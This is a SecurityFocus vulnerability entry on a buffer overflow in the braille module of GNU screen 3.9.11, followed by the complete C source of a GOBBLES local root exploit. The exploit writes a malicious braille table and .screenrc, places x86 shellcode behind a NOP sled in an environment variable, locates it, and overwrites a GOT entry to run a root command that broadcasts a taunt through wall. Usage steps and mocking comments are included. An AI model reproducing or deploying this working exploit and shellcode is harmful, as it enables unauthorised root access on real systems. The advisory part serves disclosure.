source: http://www.securityfocus.com/bid/4578/info

Screen is a freely available, open source terminal management software package. It is distributed and maintained by the Free Software Foundation. It is available for the Unix and Linux platforms.

Under some circumstances, it may be possible for a local user to take advantage of a buffer overflow in screen. Due to insufficient bounds checking performed by the braille module of screen, it is possible for a local user to pass long strings of data to the screen program, which could result in an overflow, and the overwriting of process memory. This could result in the execution of arbitrary code.

/*
  screen 3.9.11 local root exploit for braille module 
  dedicated to the $ecurity Community, where blind leading blind.
  code for: linux/x86

  to use:
  1) edit paths in #defines
  2) gcc -o GOBBLES-own-screen GOBBLES-own-screen.c
  3) ./GOBBLES-own-screen -p
  4) ./GOBBLES-own-screen -f
  5) ./GOBBLES-own-screen -a 0xGOBBLES

  if you want rootshell, that up to you to modify exploit.

  beware vicious remote root exploit coming from GOBBLES for Sun Solaris
  version 6-8, hurry up Sun to make patch. . .
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define NULLBASE 	48
#define TABLE		"/home/GOBBLES/hacking/.scrx"
#define SCREENRC	"/home/GOBBLES/hacking/.screenrc"
#define SCREEN		"/home/GOBBLES/hacking/current/screen-3.9.11/screen"
#define FIND		1
#define PUT		0
#define OFFSET		-40300 
#define SHELL		"/bin/bash" 
#define NOP		0x90

void bta(int byte, char *store);
void stuff(int que);

unsigned long get_sp(void)
{       __asm__ ("movl %esp, %eax");
	// rumor is Cousin WOBBLES leaked this public, hehehe thnx!
}

int
main(int argc, char **argv)
{
	char *a, *tmp, buf[64], store[10], c;
	unsigned long address;
	unsigned int w[4];
	int i, b, start;	
	FILE *fd;

	if(argc == 1) {
		fprintf(stderr, "\n%s [ -p ] [ -f ] [ -a <shellcode address> -o <offset to GOT address> ]\n\n", argv[0]);
		fprintf(stderr, "-p switch places shellcode into memory\n");
		fprintf(stderr, "-f switch finds shellcode address\n\n");
		fprintf(stderr, "No switch runs exploit with options:\n");
		fprintf(stderr, "\t-a <shellcode address>\n");
		fprintf(stderr, "\t-o <offset to GOT address>\n\n");
		exit(0);
	}
	
	start = OFFSET;
	
	while((c = getopt(argc, argv, "pfa:o:")) != EOF) {
		switch(c) {
			case 'p':
				stuff(PUT);
				exit(0);
			case 'f':
				stuff(FIND);
				exit(0);
			case 'a':
				sscanf(optarg, "%p", &tmp);
				address = (long)tmp;
				break;
			case 'o':
				start = atoi(optarg);
				break;
			default:
				fprintf(stderr, "hehehehe?\n");
				exit(0);
		}
	}
				
			
	fprintf(stderr, ". preparing evil braille table\n");

	if((fd = fopen(TABLE, "w")) == NULL) {
                perror("fopen");
                exit(1);
        }

	fprintf(stderr, ". converting: 0x%lx into braille table strings\n", address); 
 
	w[0] = (address & 0x000000ff);
        w[1] = (address & 0x0000ff00) >> 8;
        w[2] = (address & 0x00ff0000) >> 16;
        w[3] = (address & 0xff000000) >> 24;
	
	for(i = 0; i < 4; i++) { 
		memset(store, 'o', 9);
		bta(w[i], store);
		memset(buf, '\0', sizeof(buf));
		snprintf(buf, sizeof(buf), "%d ff %s\n", start+i, store);
		fprintf(stderr, ". writing to braille table: %s", buf);
		fprintf(fd, "%s", buf);
	}
	
	fclose(fd);
	
	fprintf(stderr, ". preparing evil .screenrc\n");
		
	if((fd = fopen(SCREENRC, "w")) == NULL) {
                perror("fopen");
                exit(1);
        }
	
	fprintf(fd, "bd_start_braille on\n");
	memset(buf, '\0', sizeof(buf));
	snprintf(buf, sizeof(buf), "bd_braille_table %s\n", TABLE);
	fprintf(fd, "%s", buf);
	fprintf(fd, "bd_type powerbraille_40\n");
	fprintf(fd, "bd_port /dev/ttyS0\n");
	fclose(fd);
	
	fprintf(stderr, ". now exploiting blind, hehehe\n");
	
	if(execl(SCREEN, "screen", "-c", SCREENRC, NULL)) {
		fprintf(stderr, ". error executing\n");
		exit(1);
	} 
}

void
bta(int byte, char *store)
{
	int check[9], i, b, tmp;
	
	check[0] = 0;
	check[1] = 1;
	check[2] = 2;
	check[3] = 4;
	check[4] = 8;
	check[5] = 16;
	check[6] = 32;
	check[7] = 64;
	check[8] = 128;

	tmp = byte;
	for(i = 8; i >= 0; i--) {
		if(check[i] <= tmp) { 
			tmp -= check[i];
			store[i] = 'x';
		}
	}
	
	for(i = 0; i < 9; i++) {
		if(store[i] == 'x') 
			store[i] = NULLBASE + i;
		else
			store[i] = NULLBASE;
	}
	store[9] = '\0';
	fprintf(stderr, ". braille table string for byte: 0x%x is: %s\n", byte, store);
}

void
stuff(int que)   
{
	char *p, codebuf[4097], code[] =
        // borrowed shellcode, GOBBLES lazy today,
	// not sure who to credit for it, if it 
        // yours please email GOBBLES@hushmail.com
        // to be acknowledged!
	"\x31\xc0\x83\xc0\x17\x31\xdb\xcd\x80\xeb"
        "\x30\x5f\x31\xc9\x88\x4f\x17\x88\x4f\x1a"
        "\x8d\x5f\x10\x89\x1f\x8d\x47\x18\x89\x47"
        "\x04\x8d\x47\x1b\x89\x47\x08\x31\xc0\x89"
        "\x47\x0c\x8d\x0f\x8d\x57\x0c\x83\xc0\x0b"
        "\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8"
        "\xcb\xff\xff\xff\x41\x41\x41\x41\x41\x41"
        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
        "\x2f\x62\x69\x6e\x2f\x73\x68\x30\x2d\x63"
        "\x30"
	
	// hehehe..hoping blind not deaf so he can hear beep, hehehe.
	"echo \"Hope you not really blind, because you now owned by unethical penetrator using ethical GOBBLES exploit, hehehehe ;Pppppp\" | wall";
	// also let user on shell provider know system comprimised, hehe.
	char *locate = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
	int i;

	if(que == PUT) {
		// adding many nops to build much suspense hehehe
		memset(&codebuf, '\0', sizeof(codebuf));
        	memset(codebuf, NOP, (sizeof(codebuf) - 1));
        	memcpy(codebuf + (sizeof(codebuf) - strlen(code) - 1), code, strlen(code));
		fprintf(stderr, ". run GOBBLES-own-screen -f\n");
		if(setenv("CODE", codebuf, 1) == -1) {
                	fprintf(stderr, ". no mem for shellcode\n");
                	return;
        	}
		
		system(SHELL);
	}
 	else if(que == FIND) {
		// track down nops
        	fprintf(stderr, ". getting address\n");
		p = (char *)get_sp();
		while((i = strncmp(p, locate, strlen(locate))) != 0) 
			p++;        

		if(i == 0) {
			fprintf(stderr, ". shellcode found at: 0x%lx\n", p+1);
             		return;
		}
		else {
			fprintf(stderr, ". trouble locating shellcode\n");
			return;
		}
	}
}